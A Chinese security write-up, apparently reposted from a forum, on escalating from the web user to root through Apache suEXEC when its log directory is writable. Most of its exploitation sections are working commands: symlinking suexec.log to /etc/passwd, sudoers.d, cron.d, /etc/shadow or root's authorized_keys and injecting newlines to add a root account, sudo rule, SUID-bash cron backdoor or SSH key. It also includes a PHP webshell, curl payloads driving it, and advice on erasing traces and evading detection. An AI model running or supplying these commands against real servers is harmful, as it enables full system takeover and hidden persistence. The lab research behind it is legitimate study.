#  Apache su EXEC 日志目录可写导致的 SUID 提权漏洞  
MazeSec
                    MazeSec  泷羽Sec   2026-07-13 10:41  
  
## 摘要  
  
Apache suEXEC 是一种允许 CGI/SSI 程序以不同于 Web 服务器用户身份运行的安全机制，其包装器二进制文件通常以 setuid root  
 权限安装。然而，当日志目录被错误配置为 Web 服务用户可写时，攻击者可通过符号链接劫持 suEXEC 日志文件，实现任意文件追加写入，最终完成从 Web 权限到系统 root 权限的完整提权。  
## 1. 引言  
  
在共享主机（Shared Hosting）和多租户 Web 环境中，Apache suEXEC 被广泛用于隔离不同用户的 CGI 进程，防止某一用户的恶意脚本影响其他租户或整个系统。suEXEC 并非 Linux 系统原生的 SUID 工具，而是 **Apache HTTP Server 的一个可选模块**  
，其包装器二进制文件（suexec  
）在安装 Apache 时通过编译选项 --enable-suexec  
 启用，并以 setuid root  
 权限安装。suEXEC 包装器在执行用户指定的 CGI 程序前，会执行一系列严格的安全检查，包括验证目标用户/组 ID、检查文件路径是否位于允许的文档根目录内，以及确保程序文件本身未被全局可写。通过这些机制，suEXEC 试图在便利性与安全性之间取得平衡。  
  
然而，安全机制的强度往往取决于其最薄弱的环节。suEXEC 在运行期间需要记录审计日志和错误信息，这些日志默认存放于 /var/log/apache2/suexec.log  
（具体路径取决于编译时的 --with-suexec-logfile  
 选项）。Apache 官方文档明确警告："任何人若能写入 Apache 日志文件所在的目录，几乎必然能够获得服务器启动时所使用的 UID（通常是 root）的访问权限。" 这一警告并非危言耸听——当日志目录的权限配置偏离安全基线时，suEXEC 的 setuid root  
 特性将从安全资产转变为攻击者的提权跳板。  
  
**致谢：**  
 本研究源于 MazeSec 团队内部靶机攻防演练。笔者在设计靶机「Oauth」时，主要预期解法为 john 日志写入的利用；感谢 顾顾顾 同学在打靶过程中发现了这一基于 suEXEC 日志目录权限配置错误的非预期提权路径，为本文提供了关键的实战案例与验证环境。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1E8ULvdwpfNwAYWKImFP3kIyrvaXabMKZaZ8uaChTicOZ9hAFPMYOMMJ97ryVY136HzyaMRQFiaEu8UhYtPROMRFeQptVt4UvfhRfIOYgxJ40/640?wx_fmt=png&from=appmsg "")  
  
## 2. suEXEC 机制与 SUID 权限模型  
### 2.1 suEXEC 的设计目标与运行原理  
  
suEXEC 的核心目标是解决 Web 服务器默认以低权限用户（如 www-data  
、apache  
）运行，而用户 CGI 脚本又需要以文件所有者身份执行之间的矛盾。通过 suEXEC，Apache 可以在收到 CGI 请求时，派生出一个以目标用户身份运行的子进程来执行脚本，而非直接使用主服务器的权限。  
  
suEXEC 包装器（suexec  
 二进制文件）必须以 setuid root  
 权限安装，因为只有 root 用户才能调用 setuid()  
 和 setgid()  
 系统调用将进程的有效用户/组 ID 切换为任意目标值。Apache 官方文档指出，如果服务器启动时未找到正确配置且 setuid root  
 的 suEXEC 包装器，则 suEXEC 机制不会被启用。这种设计使得 suEXEC 成为了系统中少数几个以 root 权限暴露给 Web 服务用户的接口之一。  
### 2.2 日志机制的安全敏感性  
  
suEXEC 在编译时通过 --with-suexec-logfile  
 选项指定日志文件路径，运行时通过 fopen(LOG_EXEC, "a")  
 以追加模式打开日志文件。在 suEXEC 的源代码实现中，日志写入操作由 log_err()  
 和 err_output()  
 函数完成，这些函数在发生安全检查失败或执行异常时被调用，将包含时间戳、错误描述以及部分命令行上下文的日志条目写入指定文件。  
  
由于 suEXEC 包装器以 root 权限运行，其对日志文件的写入操作同样以 root 权限进行。这意味着，无论日志文件的实际路径被重定向到何处，写入操作都会绕过目标文件的常规权限检查（DAC），直接以 root 身份完成追加。这种"高权限写入低权限路径"的设计，在日志目录受控的情况下是安全的；但一旦目录控制权旁落，就会演变为任意文件写入漏洞。  
## 3. 漏洞成因与配置缺陷分析  
### 3.1 安全基线与错误配置的对比  
  
在默认的安全配置下，Apache 日志目录（/var/log/apache2）的权限应严格限制：  
```
# 默认安全配置drwxr-x--- 2 root wheel 4096 May 3012:46 .drwxr-xr-x 3 root root  4096 May 3012:46 ..
```  
  
此配置中，日志目录的所有者为 root  
，所属组为 wheel  
（或 adm  
），且仅允许所有者读取、写入和列出目录内容，组用户仅允许读取和执行。Web 服务用户（www-data  
 或 apache  
）不属于 wheel  
 组，因此无法在该目录内创建、删除或修改文件。  
  
然而，在某些场景下——例如为了方便 Web 服务自身轮转日志、或是误操作将日志目录所有权授予了 Web 用户——配置可能演变为如下危险状态：  
```
# 错误配置（存在漏洞）drwxr-s--- 2 apache apache 4096 Feb 2519:46 .drwxr-xr-x 3 root   root   4096 May  810:51 ..-rw-r--r-- 1 apache apache    0 May  810:56 access.log-rw-r--r-- 1 apache apache  588 May 3012:18error.log
```  
  
在此配置中，目录的属主和属组均为 apache  
，且权限位为 rwxr-s---  
。这意味着 apache  
 用户对该目录拥有完整的读、写、执行权限，包括删除现有文件和创建新文件（包括符号链接）。SGID 位（s  
）的存在虽然会确保新建文件继承目录的属组，但并不能阻止符号链接攻击的发生。  
### 3.2 符号链接攻击的通用原理  
  
符号链接攻击（Symlink Attack）是一种经典的 UNIX 文件系统漏洞利用技术。其基本原理是：攻击者在一个自己拥有写权限的目录中创建一个符号链接，使其指向一个自己无权直接写入的目标文件；随后诱使一个以更高权限运行的进程向该符号链接路径写入数据。由于进程在打开文件时通常跟随符号链接（除非显式使用 O_NOFOLLOW  
 标志），写入操作最终会作用于目标文件，从而实现权限提升。  
  
Apache 官方安全文档对此有明确警告："如果日志目录可被非 root 用户写入，攻击者可以将日志文件替换为指向系统其他文件的符号链接，随后 root 可能会用任意数据覆盖该文件。" 这一警告与本文讨论的 suEXEC 场景高度吻合，只是 suEXEC 的 setuid root  
 特性使得攻击更加直接——攻击者无需等待 root 用户主动写入，而是可以直接调用 suEXEC 触发 root 权限的写入操作。  
### 3.3 suexec.c中的换行注入产生原理  
  
suexec.c 换行注入成因是：将含换行符的用户可控输入，未经过滤直接传入格式化日志函数，vfprintf  
 原样输出导致日志分行，实现恶意日志伪造。  
  
分析源码可以看到：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1E8ULvdwpfPv6VJOwGicJ9aIVRvERiaQa068EJwPLIPNDmuOWAPrdEJhW5vZFhy11ich1Ek9TpD8icqn2iaTwnu9Ma4DeicaWD5BADGeorsqJs9ibA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1E8ULvdwpfPKAHpjJVG1qESFnyKvDVsl5bMr4Fgpgu1hdeib1XIcwc6x3Rw8B9UHChHdgZJDfWKwNs7icFariaibib9lkgOkVcrhoZ3F3N3y7D7I/640?wx_fmt=png&from=appmsg "")  
  
1. 日志输出核心（err_output  
）  
  
```
staticvoid err_output(int is_error, const char *fmt, va_list ap) {// ... 日志打开、时间戳拼接 ...    vfprintf(log, fmt, ap);  // 关键漏洞点：无字符过滤，原样输出    fflush(log);}
```  
1. 错误日志封装（log_err  
）  
  
```
staticvoid log_err(const char *fmt, ...) {    va_list ap;    va_start(ap, fmt);    err_output(1, fmt, ap);  // 透传格式化串与参数    va_end(ap);}
```  
1. 漏洞触发点（命令校验失败）  
  
```
// 检测到非法命令，直接将用户可控 cmd 写入日志log_err("invalid command (%s)\n", cmd);
```  
  
由于输入可控，未对外部输入做字符 sanitize（过滤换行、回车、控制符），我们可构造恶意命令参数，在合法路径后插入 \n  
 换行符，例如：  
```
/tmp/attack\n[2026-05-3010:00:00]: INFO: legitimate operation
```  
  
log_err("invalid command (%s)\n", cmd)  
 中，%s  
 被替换为含 \n  
 的恶意字符串，vfprintf  
 直接解析换行。  
  
单独看，换行注入仅是一种日志污染技巧，但在符号链接劫持的上下文中，攻击者利用 suEXEC 的 root 写入权限，可以将原本只能影响日志外观的换行符，转化为影响系统核心配置文件的结构性修改。  
## 4. 多种利用方式详解  
### 4.1 写入 /etc/passwd  
  
这是最直接的提权方式。攻击者通过 suEXEC 的日志写入机制，向 /etc/passwd  
 追加一个格式合法的 root 用户条目，随后通过 su  
 命令切换至该用户完成提权。  
  
**利用命令：**  
```
# 第一步：清除原有日志，创建指向 /etc/passwd 的符号链接rm /var/log/apache2/suexec.logln -svf /etc/passwd /var/log/apache2/suexec.log# 第二步：触发 suEXEC 写入恶意 passwd 条目/usr/sbin/suexec root root $'\nll:aacFCuAIHhrCM:0:0::/root:/bin/bash\n'
```  
  
**写入效果：**  
  
suEXEC 的 log_err()  
 函数会将命令行参数原样写入日志。攻击者利用 Bash 的 $'...'  
 ANSI-C 引号扩展语法注入换行符（\n  
），使得写入内容在 /etc/passwd  
 中表现为一个独立的记录行：  
```
ll:aacFCuAIHhrCM:0:0::/root:/bin/bash
```  
  
该条目结构完全符合 /etc/passwd  
 格式规范：  
- ll  
：用户名  
  
- aacFCuAIHhrCM  
：DES 密码哈希（可通过 openssl passwd -crypt  
 自定义生成）  
  
- 0:0  
：UID 与 GID 均为 root  
  
- /root  
：家目录  
  
- /bin/bash  
：登录 shell  
  
**验证提权：**  
```
grep '^ll:' /etc/passwdsu ll# 输入密码后获得 root shellwhoami  # rootid      # uid=0(root) gid=0(root)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1E8ULvdwpfMYbDpoZSBk2ZtoeEYVxLPy8oe7VBRqdYhE7iaExBDhdWj2Ko5PwMU9XibFSD1YzEBU5DJRs305tOxPavK6KHt3oUHAeTFddDtRY/640?wx_fmt=png&from=appmsg "")  
### 4.2 写入 /etc/sudoers.d/  
  
相比 /etc/passwd  
 的显式用户创建，向 /etc/sudoers.d/  
 写入配置文件更为隐蔽。攻击者无需创建新用户，而是直接为已有的 Web 服务用户（如 apache  
）授予无密码 sudo 权限。  
  
**利用命令：**  
```
rm /var/log/apache2/suexec.logln -svf /etc/sudoers.d/apache /var/log/apache2/suexec.log/usr/sbin/suexec root root $'\napache ALL=(ALL) NOPASSWD: ALL\n'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1E8ULvdwpfNEldHNQqfXjcuAWnniaVlX1ePswcQ9pdldsU94uV40Q5Hbx4cNs2J7feC2j2KPPOzL53Ze81XhRyCsBLTXdrM8gqlcKj3JZZYg/640?wx_fmt=png&from=appmsg "")  
  
**效果：**  
 apache  
 用户可在任何终端通过 sudo -S  
 或交互式 sudo  
 直接执行 root 命令，无需密码验证。由于 /etc/sudoers.d/  
 目录下的配置文件通常由自动化工具管理，新增一个 apache  
 文件不易引起管理员警觉。  
### 4.3 写入计划任务  
  
通过向 /etc/cron.d/  
 写入定时任务，攻击者可以建立一个延迟触发的持久化后门，即使当前 webshell 被清理，仍可在未来某个时间点自动获取 root 权限。  
  
**利用命令：**  
```
rm /var/log/apache2/suexec.logln -svf /etc/cron.d/svcupdate /var/log/apache2/suexec.log/usr/sbin/suexec root root $'\n* * * * * root chmod u+s /bin/bash\n'
```  
  
**效果：**  
 每分钟执行一次 chmod u+s /bin/bash  
，为 /bin/bash  
 添加 SUID 位。攻击者随后可通过 /bin/bash -p  
 启动一个保留有效 UID 的 shell，直接获得 root 权限。  
### 4.4 写入免密 SSH 登录  
  
攻击者将自己的 SSH 公钥追加到 root 用户的 authorized_keys  
 文件中，实现无需密码、无需交互的远程 root 登录。  
  
**利用命令：**  
```
rm /var/log/apache2/suexec.logln -svf /root/.ssh/authorized_keys /var/log/apache2/suexec.log/usr/sbin/suexec root root $'\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... attacker@kali\n'
```  
  
**效果：**  
 攻击者可直接通过 SSH 以 root 身份登录目标服务器：  
```
ssh -i ~/.ssh/id_rsa root@target.ip
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1E8ULvdwpfMckJKLP2k6Vr1RibT7hX1lria3iaZWibCTWF6465WtZ8vSZdgicZsU48xQF9Aya8NUC1cAQPTlSq8EZNnFib9Bkicn0degR6KbvGbXibw/640?wx_fmt=png&from=appmsg "")  
### 4.5 写入 /etc/shadow  
  
虽然 /etc/shadow  
 默认权限为 000  
，但 root 权限的追加写入不受 DAC 限制。攻击者可向 shadow 文件追加一个已知密码哈希的 root 条目，覆盖或补充现有 root 账户的认证凭据。  
  
**利用命令：**  
```
rm /var/log/apache2/suexec.logln -svf /etc/shadow /var/log/apache2/suexec.log/usr/sbin/suexec root root $'\nroot:$6$rounds=5000$saltsalt$encryptedhash:0:0:99999:7:::\n'
```  
  
**效果：**  
 直接修改 root 用户的密码哈希，攻击者可通过 su -  
 或 SSH 密码认证登录。此方式风险较高，因为错误的 shadow 格式可能导致系统所有用户无法登录，通常仅在攻击者希望彻底接管系统且不在乎被发现时使用。  
## 5. 攻击链深度剖析  
### 5.1 攻击前提条件  
  
上述所有利用方式的成功，只需要依赖一个前置条件，即**Web 服务用户对日志目录有写权限**  
 ，攻击者能以 apache  
/www-data  
 身份在 /var/log/apache2  
 内创建/删除文件。  
  
实际情况中，有很多运维人员会为了便利日志轮转而放宽权限 ，误操作 chown apache /var/log/apache2  
，此时任意拿到 webshell 的攻击者就可以借此获得 root 权限！  
### 5.2 攻击难度评估  
<table><thead><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(216, 222, 228);"><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf=""><br/></span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(216, 222, 228);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">评估维度</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">评级</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">说明</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(246, 248, 250);border-top: 1px solid rgb(216, 222, 228);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><strong style="box-sizing: border-box;font-weight: 600;"><span leaf="">利用复杂度</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">⭐⭐☆☆☆（低）</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">仅需三步操作：删除日志→创建符号链接→调用 suEXEC，无竞争条件或内存操作</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(216, 222, 228);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><strong style="box-sizing: border-box;font-weight: 600;"><span leaf="">前置条件达成难度</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">⭐⭐⭐☆☆（中）</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">日志目录写权限属于配置错误，并非所有目标都存在；但一旦出现，利用几乎必然成功</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(246, 248, 250);border-top: 1px solid rgb(216, 222, 228);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><strong style="box-sizing: border-box;font-weight: 600;"><span leaf="">检测规避能力</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">⭐⭐⭐⭐☆（高）</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">suEXEC 为系统正常组件，写入操作表现为&#34;正常日志记录&#34;，多数 HIDS 不会告警</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(216, 222, 228);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><strong style="box-sizing: border-box;font-weight: 600;"><span leaf="">稳定性</span></strong></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">⭐⭐⭐⭐⭐（极高）</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">追加写入操作原子性强，不存在利用失败导致系统崩溃的风险</span></section></td></tr></tbody></table>### 5.3 危害程度分析  
  
该漏洞的危害可从三个维度评估：  
  
**权限提升幅度：**  
 从 Web 服务用户（通常为低权限系统用户）直接跃迁至 root，属本地权限提升（LPE）中的最高等级。一旦成功，攻击者完全控制操作系统，可任意读取敏感数据、修改系统配置、植入持久化后门。  
  
**隐蔽性与持久化：**  
 如 4.4 节所述，通过 SSH 公钥注入实现的持久化几乎无法通过常规日志审计发现。攻击者可在获取 root 权限后清理符号链接和 suEXEC 日志，仅留下一个合法的 SSH 公钥，使防御者难以追溯入侵路径。  
  
**横向移动基础：**  
 获得 root 权限后，攻击者可提取系统内存中的凭证（如 /etc/shadow  
、内存中的 Kerberos Ticket）、读取其他用户的配置文件、或利用 root 权限进一步攻击内网其他资产。该漏洞往往是内网横向移动的起点，而非终点。  
### 5.4 攻击步骤的标准化流程  
  
尽管 4.1–4.5 节展示了不同的利用目标，但其底层攻击流程遵循统一的模式：  
```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐│  1. 清理现场     │ → │  2. 劫持日志路径 │ → │  3. 触发写入     ││  rm suexec.log  │    │  ln -s 目标文件  │    │  调用 suexec    ││  （移除障碍）    │    │  （重定向写入）   │    │  （root 追加）   │└─────────────────┘    └─────────────────┘    └─────────────────┘         │                                               │         └──────────────── 可选：清理痕迹 ────────────────┘                    rm 符号链接，恢复 suexec.log
```  
  
**步骤一：清理现场**  
  
攻击者首先需要移除原有的 suexec.log  
 文件，以便后续创建同名符号链接。在属主为 apache  
 的错误配置中，此操作可直接完成；即使文件属主为 root  
，目录写权限仍允许通过 unlink()  
 删除其中的文件（只要目录权限位包含写权限）。  
  
**步骤二：劫持日志路径**  
  
通过 ln -svf <目标文件> /var/log/apache2/suexec.log  
 创建符号链接。由于 suEXEC 包装器在打开日志文件时未使用 O_NOFOLLOW  
 标志，它会跟随该链接，将日志写入到攻击者指定的目标文件末尾。  
  
**步骤三：触发 root 追加写入**  
  
调用 /usr/sbin/suexec  
 并构造包含换行符的命令行参数。suEXEC 的 log_err()  
 函数使用 vfprintf(log, fmt, ap)  
 将格式化字符串写入日志，攻击者注入的换行符会被原样保留，从而在目标文件中创建新的独立行。  
  
**可选：清理痕迹**  
  
高级攻击者在完成写入后，会删除符号链接并重新创建一个空的 suexec.log  
 文件（或从备份恢复），以消除符号链接存在的证据。由于追加写入已完成，目标文件的内容不会回滚，清理操作仅影响日志目录的外观。  
## 6. 实战复现与 Payload 构造  
### 6.1 实验环境搭建  
  
本实验基于 **Alpine Linux**  
 轻量级容器环境进行构建，利用其精简的包管理系统与最小化攻击面的特性，便于在隔离场景中快速复现该漏洞链。  
```
# 启动 Alpine 容器docker run -it --privileged --name apache-suexec-lab alpine:latest sh# 安装 Apache 及必要工具apk updateapk add apache2 apache2-utils# 模拟错误配置：将日志目录所有权授予 apache 用户mkdir -p /var/log/apache2chown apache:apache /var/log/apache2chmod 2730 /var/log/apache2# 部署测试 webshellapk add php-apache2cat > /var/www/localhost/htdocs/a.php << 'EOF'<?phpif (isset($_GET['0'])) { system($_GET['0']); } ?>EOFchown apache:apache /var/www/localhost/htdocs/a.php# 启动 Apachehttpd -D FOREGROUND &
```  
### 6.2 通过 Webshell 分步执行  
  
假设已通过漏洞获得 webshell，利用命令通过 HTTP 请求分步执行：  
```
# 第一步：清除原有日志curl 'http://oauth.dsz/a.php?0=rm+/var/log/apache2/suexec.log'# 第二步：创建指向 /etc/passwd 的符号链接curl 'http://oauth.dsz/a.php?0=ln+-svf+/etc/passwd+/var/log/apache2/suexec.log'# 第三步：触发 suEXEC 写入恶意 passwd 条目curl "http://oauth.dsz/a.php?0=/usr/sbin/suexec+root+root+$'\nll:aacFCuAIHhrCM:0:0::/root:/bin/bash\n'"
```  
  
**参数解析：**  
- $'\n'  
：Bash ANSI-C 引号扩展，将 \n  
 转义为字面换行符。该换行符作为 suEXEC 的第三个参数传递，最终出现在日志写入内容中。  
  
- root root  
：suEXEC 的前两个参数分别为目标用户和目标组。此处传入 root root  
 是为了触发 suEXEC 的权限检查逻辑，使其尝试以 root 身份执行（虽然会因安全检查失败而报错，但报错信息仍会被写入日志）。  
  
### 6.3 验证提权成功  
```
# 检查 /etc/passwd 末尾是否出现新的 root 条目grep '^ll:' /etc/passwd# 切换至新用户su ll# 输入密码（对应 DES 哈希 aacFCuAIHhrCM 的明文）# 验证 root 权限whoami   # rootid       # uid=0(root) gid=0(root)
```  
### 6.4 其他目标的快速切换  
  
仅需修改符号链接目标和 suEXEC 参数，即可切换至其他利用方式：  
```
# 方式 4.2：sudoers 注入curl 'http://oauth.dsz/a.php?0=ln+-svf+/etc/sudoers.d/apache+/var/log/apache2/suexec.log'curl "http://oauth.dsz/a.php?0=/usr/sbin/suexec+root+root+$'\napache ALL=(ALL) NOPASSWD: ALL\n'"# 方式 4.3：cron 后门curl 'http://oauth.dsz/a.php?0=ln+-svf+/etc/cron.d/svcupdate+/var/log/apache2/suexec.log'curl "http://oauth.dsz/a.php?0=/usr/sbin/suexec+root+root+$'\n* * * * * root chmod u+s /bin/bash\n'"# 方式 4.4：SSH 公钥注入curl 'http://oauth.dsz/a.php?0=ln+-svf+/root/.ssh/authorized_keys+/var/log/apache2/suexec.log'curl "http://oauth.dsz/a.php?0=/usr/sbin/suexec+root+root+$'\nssh-rsa AAAAB3... attacker@kali\n'"
```  
## 总结  
  
Apache suEXEC 的 setuid root  
 设计是一把双刃剑：它在正确配置下能够有效隔离用户 CGI 进程，但在日志目录权限失控时，会成为攻击者实现 root 提权的利器。本文深入分析了从 webshell 到 root 的完整攻击链——通过符号链接劫持 suEXEC 日志文件，利用 root 权限的追加写入向 /etc/passwd  
 注入恶意用户条目，最终获得系统最高权限。  
  
这一漏洞的本质并非 suEXEC 代码层面的逻辑缺陷，而是**配置安全与软件信任边界的交叉失效**  
。它再次印证了 UNIX 安全哲学中"日志目录不可被非特权用户写入"这一基本原则的重要性。对于安全运维人员而言，定期的权限审计、文件完整性监控以及最小权限部署，是防止此类攻击最有效、最可靠的防线。  
  
  
转自：  
https://forum.butian.net/share/4912  
  
